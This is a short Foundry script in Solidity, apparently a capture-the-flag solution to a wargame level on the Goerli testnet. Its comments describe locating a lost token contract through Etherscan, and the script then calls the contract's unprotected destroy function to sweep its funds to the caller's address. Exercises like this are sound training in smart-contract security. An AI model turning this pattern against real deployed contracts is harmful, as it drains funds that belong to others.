// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level17.sol";

contract AttackerScript is Script {
    //Go to goerli.etherscan, input your instance and search for "Contract Creation" in internal Txn
    //Click and you'll get the address, simply call destroy with your address
    SimpleToken level17 = SimpleToken(payable(0x7698B73a1059E9509d18Fd0ffEe5bdAA14269Fe6));

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      level17.destroy(payable(vm.addr(1))); //input your address
      vm.stopBroadcast();
    }
}
